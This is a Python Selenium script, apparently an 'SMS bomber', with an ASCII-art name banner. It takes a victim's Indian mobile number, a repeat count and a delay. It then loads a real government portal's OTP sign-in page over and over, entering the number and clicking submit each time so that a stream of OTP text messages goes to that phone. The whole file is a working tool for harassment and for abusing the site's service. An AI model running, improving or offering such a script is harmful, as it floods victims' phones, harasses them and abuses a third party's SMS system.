from time import sleep
from dotenv import load_dotenv
import os
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By

load_dotenv()

# Configure Chrome options
chrome_options = Options()
chrome_options.add_argument("--headless")  # Run Chrome in headless mode
#-----------------------------------------------------------------------------------------------------------------------

print("""
    @@@@@@@@@   @        @  @     @  @@@@@@@@@@@@@  @@@@@@@@@@@@@@@
    @       @   @ @      @  @    @         @               @
    @       @   @  @     @  @   @          @               @
    @       @   @   @    @  @  @           @               @
    @@@@@@@@@   @    @   @  @@@            @               @
    @       @   @     @  @  @  @           @               @
    @       @   @      @ @  @   @          @               @
    @       @   @       @@  @    @         @               @
    @       @   @        @  @     @  @@@@@@@@@@@@@         @

""")
#-----------------------------------------------------------------------------------------------------------------------
# Set the path to the Chrome driver executable
chrome_driver_path = input('D:\pycharm\scrap project\chromedriver.exe:-')

USERNAME = int(input("Enter the number without (+91): "))
iterations = int(input("Enter the number of times to send sms: "))
delay = int(input("Enter the delay between iterations (in seconds): "))

# Run the code for the specified number of iterations
for _ in range(iterations):
    # Initialize Chrome driver with options
    driver = webdriver.Chrome(executable_path=chrome_driver_path, options=chrome_options)

    insta_url = 'https://www.pgrkam.com/signin-with-otp'
    driver.get(insta_url)

    username_field = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, 'mobile')))
    username_field.send_keys(str(USERNAME))

    login_button = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, '//*[@id="rootContent"]/div[1]/div/section/div/div/div[2]/form/div[2]/div/button')))
    login_button.click()

    # Add explicit waits or other necessary steps here

    sleep(5)

    driver.quit()  # Close the browser and quit the driver

    sleep(delay)  # Wait for the specified delay before the next iteration
